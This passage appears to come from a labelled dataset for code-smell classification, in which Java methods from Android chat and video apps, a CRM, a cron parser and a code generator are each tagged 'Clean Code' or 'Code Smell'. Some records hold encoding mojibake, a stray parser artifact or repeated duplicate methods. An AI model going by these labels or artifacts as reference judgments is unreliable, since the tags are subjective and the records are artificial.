  this.cancelButton.setMnemonic(KeyEvent.VK_C);
  this.cancelButton.addActionListener(e -> {
    loadSavedFieldValues();
    enableButtons(false);
  }
);
  final GridBagConstraints cancelConstraints=createButtonConstraints(1,5);
  buttonPanel.add(this.cancelButton,cancelConstraints);
  final GridBagConstraints buttonPanelConstraints=new GridBagConstraints();
  buttonPanelConstraints.gridx=1;
  buttonPanelConstraints.gridwidth=2;
  buttonPanelConstraints.gridy=this.configParameters.size() + 1;
  buttonPanelConstraints.weightx=0.01;
  buttonPanelConstraints.fill=GridBagConstraints.HORIZONTAL;
  topPanel.add(buttonPanel,buttonPanelConstraints);
}",0,Clean Code
"public int minLevelRequired(){
  int lvl=0;
  if (currentReplyColor != selectedReplyColor) {
    MessagesController.PeerColors peerColors=getMessagesController().peerColors;
    MessagesController.PeerColor peerColor=peerColors == null ? null : peerColors.getColor(selectedReplyColor);
    if (peerColor != null) {
      lvl=Math.max(lvl,peerColor.getLvl(isGroup));
    }
  }
  if (currentReplyEmoji != selectedReplyEmoji) {
    lvl=Math.max(lvl,getMessagesController().channelBgIconLevelMin);
  }
  if (currentProfileColor != selectedProfileColor) {
    MessagesController.PeerColors peerColors=getMessagesController().profilePeerColors;
    MessagesController.PeerColor peerColor=peerColors == null ? null : peerColors.getColor(selectedProfileColor);
    if (peerColor != null) {
      lvl=Math.max(lvl,peerColor.getLvl(isGroup));
    }
  }
  if (currentProfileEmoji != selectedProfileEmoji) {
    lvl=Math.max(lvl,getProfileIconLevelMin());
  }
  if (!DialogObject.emojiStatusesEqual(currentStatusEmoji,selectedStatusEmoji)) {
    lvl=Math.max(lvl,getEmojiStatusLevelMin());
  }
  if (!ChatThemeController.wallpaperEquals(currentWallpaper,selectedWallpaper)) {
    lvl=Math.max(lvl,getWallpaperLevelMin());
  }
  return lvl;
}",0,Clean Code
"public static String formatDistance(float distance,int type){
  return formatDistance(distance,type,null);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@7b4183e3",0,Clean Code
"public static List<ApplicationInfo> getInstalledApplications(PackageManager packageManager){
  if (packageManager == null) {
    return Collections.emptyList();
  }
  @SuppressLint(""WrongConstant"") List<ApplicationInfo> installedApplications=packageManager.getInstalledApplications(PackageManager.GET_UNINSTALLED_PACKAGES | PackageManager.GET_DISABLED_COMPONENTS);
  int userApp=0;
  for (  ApplicationInfo installedApplication : installedApplications) {
    if ((installedApplication.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
      if (userApp++ > 3) {
        return installedApplications;
      }
    }
  }
  List<ApplicationInfo> applicationInfos=new ArrayList<>();
  for (int uid=0; uid <= Process.LAST_APPLICATION_UID; uid++) {
    String[] packagesForUid=packageManager.getPackagesForUid(uid);
    if (packagesForUid == null || packagesForUid.length == 0) {
      continue;
    }
    for (    String pkg : packagesForUid) {
      try {
        ApplicationInfo applicationInfo=packageManager.getApplicationInfo(pkg,0);
        applicationInfos.add(applicationInfo);
      }
 catch (      PackageManager.NameNotFoundException ignored) {
      }
    }
  }
  return applicationInfos;
}",1,Code Smell
"private ComponentPackageDOExample buildExample(ComponentPackageQueryCondition condition){
  ComponentPackageDOExample example=new ComponentPackageDOExample();
  ComponentPackageDOExample.Criteria criteria=example.createCriteria();
  if (Objects.nonNull(condition.getId())) {
    criteria.andIdEqualTo(condition.getId());
  }
  if (CollectionUtils.isNotEmpty(condition.getIdList())) {
    criteria.andIdIn(condition.getIdList());
  }
  if (StringUtils.isNotBlank(condition.getAppId())) {
    criteria.andAppIdEqualTo(condition.getAppId());
  }
  if (StringUtils.isNotBlank(condition.getComponentType())) {
    criteria.andComponentTypeEqualTo(condition.getComponentType());
  }
  if (StringUtils.isNotBlank(condition.getComponentName())) {
    criteria.andComponentNameEqualTo(condition.getComponentName());
  }
  if (StringUtils.isNotBlank(condition.getPackageCreator())) {
    criteria.andPackageCreatorEqualTo(condition.getPackageCreator());
  }
  if (StringUtils.isNotBlank(condition.getPackageVersion())) {
    criteria.andPackageVersionEqualTo(condition.getPackageVersion());
  }
  if (StringUtils.isNotBlank(condition.getNamespaceId())) {
    criteria.andNamespaceIdEqualTo(condition.getNamespaceId());
  }
  if (StringUtils.isNotBlank(condition.getStageId())) {
    criteria.andStageIdEqualTo(condition.getStageId());
  }
  return example;
}
",0,Clean Code
"@Override public void clearSearch(){
  mSearchQuery=null;
  for (  VideoGroupObjectAdapter adapter : mSearchGroupAdapters.values()) {
    adapter.clear();
  }
  mSearchGroupAdapters.clear();
  ObjectAdapter resultsAdapter=getResultsAdapter();
  if (resultsAdapter == null) {
    return;
  }
  int size=resultsAdapter.size();
  int index=0;
  for (int i=0; i < size; i++) {
    Object row=resultsAdapter.get(index);
    if (row instanceof ListRow && ((ListRow)row).getAdapter() instanceof VideoGroupObjectAdapter) {
      detachAdapter(index);
    }
 else {
      index++;
    }
  }
}",0,Clean Code
"@Override protected void onDraw(Canvas canvas){
  super.onDraw(canvas);
  if (pager.getAdapter() instanceof IconTabProvider) {
    ((IconTabProvider)pager.getAdapter()).customOnDraw(canvas,this,position);
  }
}
@Override protected void onDraw(Canvas canvas){
  if (isInEditMode() || tabCount == 0) {
    super.onDraw(canvas);
    return;
  }
  final int height=getHeight();
  if (underlineHeight != 0) {
    rectPaint.setColor(underlineColor);
    AndroidUtilities.rectTmp.set(0,height - underlineHeight,tabsContainer.getWidth(),height);
    canvas.drawRoundRect(AndroidUtilities.rectTmp,underlineHeight / 2f,underlineHeight / 2f,rectPaint);
  }
  View currentTab=tabsContainer.getChildAt(currentPosition);
  if (currentTab != null) {
    float lineLeft=currentTab.getLeft() + currentTab.getPaddingLeft();
    float lineRight=currentTab.getRight() - currentTab.getPaddingRight();
    if (currentPositionOffset > 0f && currentPosition < tabCount - 1) {
      View nextTab=tabsContainer.getChildAt(currentPosition + 1);
      final float nextTabLeft=nextTab.getLeft() + nextTab.getPaddingLeft();
      final float nextTabRight=nextTab.getRight() - nextTab.getPaddingRight();
      lineLeft=(currentPositionOffset * nextTabLeft + (1f - currentPositionOffset) * lineLeft);
      lineRight=(currentPositionOffset * nextTabRight + (1f - currentPositionOffset) * lineRight);
      lineLeftAnimated.set(lineLeft,true);
      lineRightAnimated.set(lineRight,true);
      if (currentTab instanceof TextTab) {
        ((TextTab)currentTab).setSelectedProgress(1f - currentPositionOffset);
      }
      if (nextTab instanceof TextTab) {
        ((TextTab)nextTab).setSelectedProgress(currentPositionOffset);
      }
    }
 else {
      lineLeft=lineLeftAnimated.set(lineLeft);
      lineRight=lineRightAnimated.set(lineRight);
    }
    if (indicatorHeight != 0) {
      rectPaint.setColor(indicatorColor);
      AndroidUtilities.rectTmp.set(lineLeft - AndroidUtilities.dp(12),AndroidUtilities.dp(6),lineRight + AndroidUtilities.dp(12),height - AndroidUtilities.dp(6));
      canvas.drawRoundRect(AndroidUtilities.rectTmp,AndroidUtilities.rectTmp.height() / 2f,AndroidUtilities.rectTmp.height() / 2f,rectPaint);
    }
  }
  super.onDraw(canvas);
}
@Override protected void onDraw(Canvas canvas){
  super.onDraw(canvas);
  if (pager.getAdapter() instanceof IconTabProvider) {
    ((IconTabProvider)pager.getAdapter()).customOnDraw(canvas,this,position);
  }
}",1,Code Smell
"/** 
 * Selects a Row and perform an optional task on the Row.
 */
public void setSelectedPosition(int rowPosition,boolean smooth,final Presenter.ViewHolderTask rowHolderTask){
}
/** 
 * Selects a Row.
 */
public void setSelectedPosition(int rowPosition,boolean smooth){
}
/** 
 * Selects a Row and perform an optional task on the Row.
 */
public void setSelectedPosition(int rowPosition,boolean smooth,final Presenter.ViewHolderTask rowHolderTask){
}
/** 
 * Selects a Row.
 */
public void setSelectedPosition(int rowPosition,boolean smooth){
}
@Override public void setSelectedPosition(int rowPosition,boolean smooth,final Presenter.ViewHolderTask rowHolderTask){
  getFragment().setSelectedPosition(rowPosition,smooth,rowHolderTask);
}
@Override public void setSelectedPosition(int rowPosition,boolean smooth){
  getFragment().setSelectedPosition(rowPosition,smooth);
}
@Override public void setSelectedPosition(int rowPosition,boolean smooth,final Presenter.ViewHolderTask rowHolderTask){
  getFragment().setSelectedPosition(rowPosition,smooth,rowHolderTask);
}
@Override public void setSelectedPosition(int rowPosition,boolean smooth){
  getFragment().setSelectedPosition(rowPosition,smooth);
}
",0,Clean Code
"public void drawDividers(Canvas canvas,int w,int h){
  if (mDividerPaint == null && (mTopDividerHeight > 0 || mBottomDividerHeight > 0 || mLeftDividerWidth > 0 || mRightDividerWidth > 0)) {
    mDividerPaint=new Paint();
  }
  if (mTopDividerHeight > 0) {
    mDividerPaint.setStrokeWidth(mTopDividerHeight);
    mDividerPaint.setColor(mTopDividerColor);
    if (mTopDividerAlpha < 255) {
      mDividerPaint.setAlpha(mTopDividerAlpha);
    }
    float y=mTopDividerHeight * 1f / 2;
    canvas.drawLine(mTopDividerInsetLeft,y,w - mTopDividerInsetRight,y,mDividerPaint);
  }
  if (mBottomDividerHeight > 0) {
    mDividerPaint.setStrokeWidth(mBottomDividerHeight);
    mDividerPaint.setColor(mBottomDividerColor);
    if (mBottomDividerAlpha < 255) {
      mDividerPaint.setAlpha(mBottomDividerAlpha);
    }
    float y=(float)Math.floor(h - mBottomDividerHeight * 1f / 2);
    canvas.drawLine(mBottomDividerInsetLeft,y,w - mBottomDividerInsetRight,y,mDividerPaint);
  }
  if (mLeftDividerWidth > 0) {
    mDividerPaint.setStrokeWidth(mLeftDividerWidth);
    mDividerPaint.setColor(mLeftDividerColor);
    if (mLeftDividerAlpha < 255) {
      mDividerPaint.setAlpha(mLeftDividerAlpha);
    }
    canvas.drawLine(0,mLeftDividerInsetTop,0,h - mLeftDividerInsetBottom,mDividerPaint);
  }
  if (mRightDividerWidth > 0) {
    mDividerPaint.setStrokeWidth(mRightDividerWidth);
    mDividerPaint.setColor(mRightDividerColor);
    if (mRightDividerAlpha < 255) {
      mDividerPaint.setAlpha(mRightDividerAlpha);
    }
    canvas.drawLine(w,mRightDividerInsetTop,w,h - mRightDividerInsetBottom,mDividerPaint);
  }
}",0,Clean Code
"public static Drawable getOrCreate(Drawable backgroundDrawable,TLRPC.WallPaper wallpaper,boolean themeIsDark){
  if (backgroundDrawable instanceof ChatBackgroundDrawable) {
    ChatBackgroundDrawable chatBackgroundDrawable=(ChatBackgroundDrawable)backgroundDrawable;
    if (wallpaper.uploadingImage != null) {
      if (wallpaper.uploadingImage.equals(chatBackgroundDrawable.wallpaper.uploadingImage)) {
        if (wallpaper.settings != null && chatBackgroundDrawable.wallpaper.settings != null && wallpaper.settings.intensity > 0) {
          if (chatBackgroundDrawable.themeIsDark == themeIsDark) {
            return chatBackgroundDrawable;
          }
        }
 else {
          return chatBackgroundDrawable;
        }
      }
    }
 else     if (wallpaper.id == chatBackgroundDrawable.wallpaper.id && TextUtils.equals(hash(wallpaper.settings),hash(chatBackgroundDrawable.wallpaper.settings))) {
      if (wallpaper.document != null && !wallpaper.pattern && wallpaper.settings != null && wallpaper.settings.intensity > 0) {
        if (chatBackgroundDrawable.themeIsDark == themeIsDark) {
          return chatBackgroundDrawable;
        }
      }
 else {
        return chatBackgroundDrawable;
      }
    }
  }
  return new ChatBackgroundDrawable(wallpaper,themeIsDark,false);
}",0,Clean Code
"public static List<Condition> geneEruptSearchCondition(EruptModel eruptModel,List<Condition> searchCondition){
  checkEruptSearchNotnull(eruptModel,searchCondition);
  List<Condition> legalConditions=new ArrayList<>();
  if (null != searchCondition) {
    for (    Condition condition : searchCondition) {
      EruptFieldModel eruptFieldModel=eruptModel.getEruptFieldMap().get(condition.getKey());
      if (null != eruptFieldModel) {
        Edit edit=eruptFieldModel.getEruptField().edit();
        EditTypeSearch editTypeSearch=AnnotationProcess.getEditTypeSearch(edit.type());
        if (null != editTypeSearch && editTypeSearch.value()) {
          if (edit.search().value() && null != condition.getValue()) {
            if (condition.getValue() instanceof Collection) {
              Collection<?> collection=(Collection<?>)condition.getValue();
              if (collection.size() == 0) {
                continue;
              }
            }
            if (edit.search().vague()) {
              condition.setExpression(editTypeSearch.vagueMethod());
            }
 else {
              condition.setExpression(QueryExpression.EQ);
            }
            legalConditions.add(condition);
          }
        }
      }
    }
  }
  return legalConditions;
}",0,Clean Code
"private AndroidBatteryInfo parseRawResultFile(File rawFile,String packageName,Logger logger){
  if (!rawFile.isFile()) {
    return null;
  }
  AndroidBatteryInfo batteryInfo=new AndroidBatteryInfo();
  float totalUsage=0.0f;
  float appUsage=0.0f;
  int mode=1;
  String uid=null;
  boolean isCalculatedTotalUsage=false;
  try (FileInputStream stream=new FileInputStream(rawFile);InputStreamReader reader=new InputStreamReader(stream,StandardCharsets.UTF_8);BufferedReader in=new BufferedReader(reader)){
    List<String> contents=new ArrayList<>();
    String inputLine;
    while ((inputLine=in.readLine()) != null) {
      inputLine=inputLine.trim().toLowerCase();
      contents.add(inputLine);
    }
    for (    String line : contents) {
      if (Pattern.matches(""u0.*:"",line)) {
        uid=line.split("":"")[0];
      }
    }
    if (uid == null) {
      logger.error(String.format(""Could not parse the battery usage of %s in battery info file: %s"",packageName,rawFile.getAbsolutePath()));
      return null;
    }
    for (    String line : contents) {
      if (mode == 1) {
        if (Pattern.matches(""capacity:.*computed drain:.*"",line)) {
          totalUsage=parseFloat(line.split(""computed drain: "")[1].split("","")[0],line,logger);
          if (totalUsage == 0.0) {
            mode=2;
          }
        }
      }
 else {
        if (Pattern.matches("".*global.*"",line)) {
          isCalculatedTotalUsage=true;
          continue;
        }
        if (isCalculatedTotalUsage && line.startsWith(""uid"")) {
          isCalculatedTotalUsage=false;
        }
        if (isCalculatedTotalUsage) {
          totalUsage+=parseFloat(line.split("" "")[1].trim(),line,logger);
        }
      }
      if (Pattern.matches(""uid "" + uid + "":.*"",line)) {
        appUsage=parseFloat(line.split("": "")[1].split("" "")[0],line,logger);
        batteryInfo.setAppUsage(appUsage);
        batteryInfo.setRatio(appUsage / totalUsage);
        batteryInfo.setCpu(parseAppDetails(line,""cpu="",logger));
        batteryInfo.setSystemService(parseAppDetails(line,""system_services="",logger));
        batteryInfo.setScreen(parseAppDetails(line,""screen="",logger));
        batteryInfo.setWakeLock(parseAppDetails(line,""wakelock="",logger));
        batteryInfo.setWifi(parseAppDetails(line,""wifi="",logger));
      }
      batteryInfo.setTotal(totalUsage);
    }
  }
 catch (  IOException e) {
    logger.info(""Failed to parse the battery info file: "" + rawFile.getAbsolutePath());
    return null;
  }
  return batteryInfo;
}",1,Code Smell
"protected void buildExpression(String expression) throws ParseException {
  expressionParsed=true;
  try {
    if (seconds == null) {
      seconds=new TreeSet<Integer>();
    }
    if (minutes == null) {
      minutes=new TreeSet<Integer>();
    }
    if (hours == null) {
      hours=new TreeSet<Integer>();
    }
    if (daysOfMonth == null) {
      daysOfMonth=new TreeSet<Integer>();
    }
    if (months == null) {
      months=new TreeSet<Integer>();
    }
    if (daysOfWeek == null) {
      daysOfWeek=new TreeSet<Integer>();
    }
    if (years == null) {
      years=new TreeSet<Integer>();
    }
    int exprOn=SECOND;
    StringTokenizer exprsTok=new StringTokenizer(expression,"" \t"",false);
    while (exprsTok.hasMoreTokens() && exprOn <= YEAR) {
      String expr=exprsTok.nextToken().trim();
      if (exprOn == DAY_OF_MONTH && expr.indexOf('L') != -1 && expr.length() > 1 && expr.contains("","")) {
        throw new ParseException(""Support for specifying 'L' and 'LW' with other days of the month is not implemented"",-1);
      }
      if (exprOn == DAY_OF_WEEK && expr.indexOf('L') != -1 && expr.length() > 1 && expr.contains("","")) {
        throw new ParseException(""Support for specifying 'L' with other days of the week is not implemented"",-1);
      }
      if (exprOn == DAY_OF_WEEK && expr.indexOf('#') != -1 && expr.indexOf('#',expr.indexOf('#') + 1) != -1) {
        throw new ParseException(""Support for specifying multiple \""nth\"" days is not implemented."",-1);
      }
      StringTokenizer vTok=new StringTokenizer(expr,"","");
      while (vTok.hasMoreTokens()) {
        String v=vTok.nextToken();
        storeExpressionVals(0,v,exprOn);
      }
      exprOn++;
    }
    if (exprOn <= DAY_OF_WEEK) {
      throw new ParseException(""Unexpected end of expression."",expression.length());
    }
    if (exprOn <= YEAR) {
      storeExpressionVals(0,""*"",YEAR);
    }
    TreeSet<Integer> dow=getSet(DAY_OF_WEEK);
    TreeSet<Integer> dom=getSet(DAY_OF_MONTH);
    boolean dayOfMSpec=!dom.contains(NO_SPEC);
    boolean dayOfWSpec=!dow.contains(NO_SPEC);
    if (!dayOfMSpec || dayOfWSpec) {
      if (!dayOfWSpec || dayOfMSpec) {
        throw new ParseException(""Support for specifying both a day-of-week AND a day-of-month parameter is not implemented."",0);
      }
    }
  }
 catch (  ParseException pe) {
    throw pe;
  }
catch (  Exception e) {
    throw new ParseException(""Illegal cron expression format ("" + e.toString() + "")"",0);
  }
}",0,Clean Code
"@NonNull public Path findOrCreateFile(@NonNull String displayName,@Nullable String mimeType) throws IOException {
  displayName=Paths.sanitize(displayName,true);
  if (displayName == null) {
    throw new IOException(""Empty display name."");
  }
  if (displayName.indexOf(File.separatorChar) != -1) {
    throw new IllegalArgumentException(""Display name contains file separator."");
  }
  DocumentFile documentFile=getRealDocumentFile(this.documentFile);
  if (!documentFile.isDirectory()) {
    throw new IOException(""Current file is not a directory."");
  }
  String extension=null;
  if (mimeType != null) {
    extension=MimeTypeMap.getSingleton().getExtensionFromMimeType(mimeType);
  }
 else   mimeType=DEFAULT_MIME;
  String nameWithExtension=displayName + (extension != null ? ""."" + extension : """");
  checkVfs(Paths.appendPathSegment(documentFile.getUri(),nameWithExtension));
  DocumentFile file=documentFile.findFile(displayName);
  if (file != null) {
    if (file.isDirectory()) {
      throw new IOException(""Directory cannot be converted to file"");
    }
    return new PathImpl(context,file);
  }
  file=documentFile.createFile(mimeType,displayName);
  if (file == null) {
    throw new IOException(""Could not create "" + documentFile.getUri() + File.separatorChar+ nameWithExtension+ "" with type ""+ mimeType);
  }
  return new PathImpl(context,file);
}",1,Code Smell
"private MainPlayerController(Context context){
  if (context instanceof Activity) {
    mActivity=new WeakReference<>((Activity)context);
  }
  mEventListeners.add(new AutoFrameRateController());
  mEventListeners.add(new PlayerUIController());
  mEventListeners.add(new HQDialogController());
  mEventListeners.add(new VideoStateController());
  mEventListeners.add(new SuggestionsController());
  mEventListeners.add(new VideoLoaderController());
  mEventListeners.add(new RemoteController(context));
  mEventListeners.add(new ContentBlockController());
  mEventListeners.add(new ChatController());
  mEventListeners.add(new CommentsController());
}
",0,Clean Code
"@Override Duration increment(Duration time,int steps){
  return checkBounds(time,time.plusDays(steps));
}
@Override Duration increment(Duration time,int steps){
  return checkBounds(time,time.plusHours(steps));
}
@Override Duration increment(Duration time,int steps){
  return checkBounds(time,time.plusMinutes(steps * TransactionInput.RELATIVE_TIMELOCK_SECONDS_INCREMENT / 60));
}
@Override Duration increment(Duration time,int steps){
  return time.plusSeconds(steps * TransactionInput.RELATIVE_TIMELOCK_SECONDS_INCREMENT);
}
abstract Duration increment(Duration time,int steps);
@Override public void increment(int steps){
  checkMode();
  setValue(mode.get().increment(getValue(),steps));
  mode.get().select(RelativeTimelockSpinner.this);
}",0,Clean Code
"/** 
 * Called to change DetailsOverviewRow view status when current selected row position or selected sub position changed.  Subclass may override.   The default implementation switches between three states based on the positions: {@link FullWidthDetailsOverviewRowPresenter#STATE_HALF}, {@link FullWidthDetailsOverviewRowPresenter#STATE_FULL} and{@link FullWidthDetailsOverviewRowPresenter#STATE_SMALL}.
 * @param presenter   The presenter used to create row ViewHolder.
 * @param viewHolder  The visible (attached) row ViewHolder, note that it may or may notbe selected.
 * @param adapterPosition  The adapter position of viewHolder inside adapter.
 * @param selectedPosition The adapter position of currently selected row.
 * @param selectedSubPosition The sub position within currently selected row.  This is usedWhen a row has multiple alignment positions.
 */
protected void onSetDetailsOverviewRowStatus(FullWidthDetailsOverviewRowPresenter presenter,FullWidthDetailsOverviewRowPresenter.ViewHolder viewHolder,int adapterPosition,int selectedPosition,int selectedSubPosition){
  if (selectedPosition > adapterPosition) {
    presenter.setState(viewHolder,FullWidthDetailsOverviewRowPresenter.STATE_HALF);
  }
 else   if (selectedPosition == adapterPosition && selectedSubPosition == 1) {
    presenter.setState(viewHolder,FullWidthDetailsOverviewRowPresenter.STATE_HALF);
  }
 else   if (selectedPosition == adapterPosition && selectedSubPosition == 0) {
    presenter.setState(viewHolder,FullWidthDetailsOverviewRowPresenter.STATE_FULL);
  }
 else {
    presenter.setState(viewHolder,FullWidthDetailsOverviewRowPresenter.STATE_SMALL);
  }
}",0,Clean Code
"private void requestLinkPreview(TLRPC.TL_messages_getWebPagePreview req,Utilities.Callback2<Boolean,TLRPC.WebPage> done){
  cancelSearchLinks();
  linkSearchRequestId=getConnectionsManager().sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
    linkSearchRequestId=0;
    if (response instanceof TLRPC.TL_messageMediaWebPage) {
      TLRPC.TL_messageMediaWebPage media=(TLRPC.TL_messageMediaWebPage)response;
      if (media.webpage != null && ""telegram_story"".equals(media.webpage.type)) {
        TLRPC.TL_webPageAttributeStory _attrStory=null;
        if (media.webpage.attributes != null) {
          for (int i=0; i < media.webpage.attributes.size(); ++i) {
            if (media.webpage.attributes.get(i) instanceof TLRPC.TL_webPageAttributeStory) {
              _attrStory=(TLRPC.TL_webPageAttributeStory)media.webpage.attributes.get(i);
              break;
            }
          }
        }
        if (_attrStory == null) {
          done.run(false,null);
          return;
        }
        if (_attrStory != null && _attrStory.storyItem != null) {
          done.run(true,media.webpage);
          return;
        }
        final TLRPC.TL_webPageAttributeStory attrStory=_attrStory;
        getMessagesStorage().getStorageQueue().postRunnable(() -> {
          try {
            LongSparseArray<ArrayList<MessageObject>> array=new LongSparseArray<>();
            TLRPC.TL_message message=new TLRPC.TL_message();
            message.message="""";
            message.id=0;
            message.media=media;
            ArrayList<MessageObject> list=new ArrayList<>();
            list.add(new MessageObject(currentAccount,message,false,false));
            array.put(DialogObject.getPeerDialogId(attrStory.peer),list);
            getMessagesController().getStoriesController().getStoriesStorage().fillMessagesWithStories(array,() -> {
              MessageObject result=null;
              if (array.size() == 1 && array.valueAt(0) != null && array.valueAt(0).size() == 1) {
                result=array.valueAt(0).get(0);
              }
              if (result != null && result.messageOwner != null && result.messageOwner.media != null && result.messageOwner.media.webpage != null && result.messageOwner.media.webpage.attributes != null) {
                for (int i=0; i < result.messageOwner.media.webpage.attributes.size(); ++i) {
                  TLRPC.WebPageAttribute attr=result.messageOwner.media.webpage.attributes.get(i);
                  if (attr instanceof TLRPC.TL_webPageAttributeStory) {
                    if (((TLRPC.TL_webPageAttributeStory)attr).storyItem != null) {
                      final TLRPC.WebPage webpage=result.messageOwner.media.webpage;
                      AndroidUtilities.runOnUIThread(() -> {
                        done.run(true,webpage);
                      }
);
                      return;
                    }
                  }
                }
              }
              AndroidUtilities.runOnUIThread(() -> {
                done.run(false,null);
              }
);
            }
,classGuid,false);
          }
 catch (          Exception ignore) {
          }
        }
);
      }
 else {
        done.run(media.webpage != null,media.webpage);
      }
    }
 else {
      done.run(false,null);
    }
  }
));
  getConnectionsManager().bindRequestToGuid(linkSearchRequestId,classGuid);
}",1,Code Smell
"public void recycle(){
  broadcast.unregister();
  if (mListeningKey) {
    AccessibilityService service=mAccessibilityBridge.getService();
    if (service != null) {
      service.getOnKeyObserver().removeListener(this);
      mListeningKey=false;
    }
  }
  if (mTouchObserver != null) {
    mTouchObserver.stop();
  }
  if (mListeningNotification) {
    mAccessibilityBridge.getNotificationObserver().removeNotificationListener(this);
    mAccessibilityBridge.getNotificationObserver().removeToastListener(this);
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2 && NotificationListenerService.Companion.getInstance() != null) {
      NotificationListenerService.Companion.getInstance().removeListener(this);
    }
  }
  if (mKeyInterceptor != null) {
    AccessibilityService service=mAccessibilityBridge.getService();
    if (service != null) {
      service.getKeyInterrupterObserver().removeKeyInterrupter(mKeyInterceptor);
    }
    mKeyInterceptor=null;
  }
  if (mListeningGesture) {
    AccessibilityService service=mAccessibilityBridge.getService();
    if (service != null) {
      service.getGestureEventDispatcher().removeListener(this);
    }
  }
}",0,Clean Code
"@Override public List<CrmStatisticsPoolSummaryByDateRespVO> getPoolSummaryByDate(CrmStatisticsCustomerReqVO reqVO){
  reqVO.setUserIds(getUserIds(reqVO));
  if (CollUtil.isEmpty(reqVO.getUserIds())) {
    return Collections.emptyList();
  }
  List<CrmStatisticsPoolSummaryByDateRespVO> customerPutCountList=customerMapper.selectPoolCustomerPutCountByDate(reqVO);
  List<CrmStatisticsPoolSummaryByDateRespVO> customerTakeCountList=customerMapper.selectPoolCustomerTakeCountByDate(reqVO);
  List<LocalDateTime[]> timeRanges=LocalDateTimeUtils.getDateRangeList(reqVO.getTimes()[0],reqVO.getTimes()[1],reqVO.getInterval());
  return convertList(timeRanges,times -> {
    Integer customerPutCount=customerPutCountList.stream().filter(vo -> LocalDateTimeUtils.isBetween(times[0],times[1],vo.getTime())).mapToInt(CrmStatisticsPoolSummaryByDateRespVO::getCustomerPutCount).sum();
    Integer customerTakeCount=customerTakeCountList.stream().filter(vo -> LocalDateTimeUtils.isBetween(times[0],times[1],vo.getTime())).mapToInt(CrmStatisticsPoolSummaryByDateRespVO::getCustomerTakeCount).sum();
    return new CrmStatisticsPoolSummaryByDateRespVO().setTime(LocalDateTimeUtils.formatDateRange(times[0],times[1],reqVO.getInterval())).setCustomerPutCount(customerPutCount).setCustomerTakeCount(customerTakeCount);
  }
);
}",0,Clean Code
"/** 
 * 鍒犻櫎鏂囦欢澶逛互鍙婄洰褰曚笅鐨勬枃浠�
 * @param filePath 琚垹闄ょ洰褰曠殑鏂囦欢璺緞
 * @return 鐩綍鍒犻櫎鎴愬姛杩斿洖true锛屽惁鍒欒繑鍥瀎alse
 */
public static boolean deleteDirectory(String filePath){
  boolean flag;
  if (filePath == null || filePath.length() == 0)   return false;
  if (!filePath.endsWith(File.separator)) {
    filePath=filePath + File.separator;
  }
  File dirFile=new File(filePath);
  try {
    if (!dirFile.exists() || !dirFile.isDirectory()) {
      return false;
    }
    flag=true;
    File[] files=dirFile.listFiles();
    for (    File file : files) {
      if (file.isFile()) {
        flag=deleteFile(file.getAbsolutePath());
      }
 else {
        flag=deleteDirectory(file.getAbsolutePath());
      }
      if (!flag)       break;
    }
    if (!flag)     return false;
  }
 catch (  Exception e) {
    return false;
  }
  return dirFile.delete();
}",0,Clean Code
"@Override public boolean onExecute(String verb,String parameter,MissionInit missionInit){
  if (verb == null || verb.length() == 0) {
    return false;
  }
  if (verb.equalsIgnoreCase(ContinuousMovementCommand.MOVE.value())) {
    float targetVelocity=clamp(Float.valueOf(parameter));
    if (targetVelocity != mTargetVelocity) {
      mTargetVelocity=targetVelocity;
      mTicksSinceLastVelocityChange=0;
    }
    return true;
  }
 else   if (verb.equalsIgnoreCase(ContinuousMovementCommand.STRAFE.value())) {
    this.overrideMovement.moveStrafe=-clamp(Float.valueOf(parameter));
    return true;
  }
 else   if (verb.equalsIgnoreCase(ContinuousMovementCommand.PITCH.value())) {
    this.pitchScale=clamp(Float.valueOf(parameter));
    this.lastAngularUpdateTime=System.currentTimeMillis();
    return true;
  }
 else   if (verb.equalsIgnoreCase(ContinuousMovementCommand.TURN.value())) {
    this.yawScale=clamp(Float.valueOf(parameter));
    this.lastAngularUpdateTime=System.currentTimeMillis();
    return true;
  }
 else {
    boolean value=parameter.equalsIgnoreCase(ON_COMMAND_STRING);
    if (verb.equals(ContinuousMovementCommand.JUMP.value())) {
      this.overrideMovement.jump=value;
      return true;
    }
 else     if (verb.equalsIgnoreCase(ContinuousMovementCommand.CROUCH.value())) {
      this.overrideMovement.sneak=value;
      return true;
    }
  }
  return false;
}",0,Clean Code
"public void writeLibrary(Collection<FuncInfo> functions,Map<String,List<String>> enumMap) throws IOException {
  try (BufferedWriter writer=Files.newBufferedWriter(dir.resolve(className + "".java""))){
    writer.append(""package "").append(packageName).append("";\n\n"");
    writer.append(""import com.sun.jna.Callback;\n"");
    writer.append(""import com.sun.jna.Library;\n"");
    writer.append(""import com.sun.jna.Pointer;\n"");
    writer.append(""import com.sun.jna.ptr.PointerByReference;\n"");
    writer.append(""import java.nio.ByteBuffer;\n"");
    writer.append(""import java.nio.FloatBuffer;\n"");
    writer.append(""import java.nio.IntBuffer;\n"");
    writer.append(""import java.nio.LongBuffer;\n"");
    writer.append(""\npublic interface "").append(className).append("" extends Library {\n\n"");
    for (    Map.Entry<String,List<String>> entry : enumMap.entrySet()) {
      String name=entry.getKey();
      writer.append(""\n    enum "").append(name).append("" {\n"");
      List<String> fields=entry.getValue();
      int count=0;
      for (      String field : fields) {
        writer.append(""        "").append(field);
        if (++count < fields.size()) {
          writer.append(',');
        }
        writer.append('\n');
      }
      writer.append(""    }\n"");
    }
    for (    TypeDefine typeDefine : typedefMap.values()) {
      if (typeDefine.isCallBack()) {
        String callbackName=typeDefine.getDataType().getType();
        String returnType=mapping.getProperty(callbackName);
        if (returnType == null) {
          returnType=typeDefine.getValue();
        }
        writer.append(""\n    interface "").append(callbackName);
        writer.append("" extends Callback {\n"");
        writer.append(""        "").append(returnType).append("" apply("");
        writeParameters(writer,callbackName,typeDefine.getParameters());
        writer.append("");\n"");
        writer.append(""    }\n"");
      }
    }
    for (    FuncInfo info : functions) {
      writeFunction(writer,info);
    }
    writer.append(""}\n"");
  }
 }",1,Code Smell
"@Override public void serialize(RowData consumedRow,TypedMessageBuilder<RowData> messageBuilder){
  if (keySerialization == null && !hasMetadata) {
    messageBuilder.value(consumedRow);
    return;
  }
  if (delayMilliseconds > 0) {
    messageBuilder.deliverAfter(delayMilliseconds,TimeUnit.MILLISECONDS);
  }
  if (keySerialization != null) {
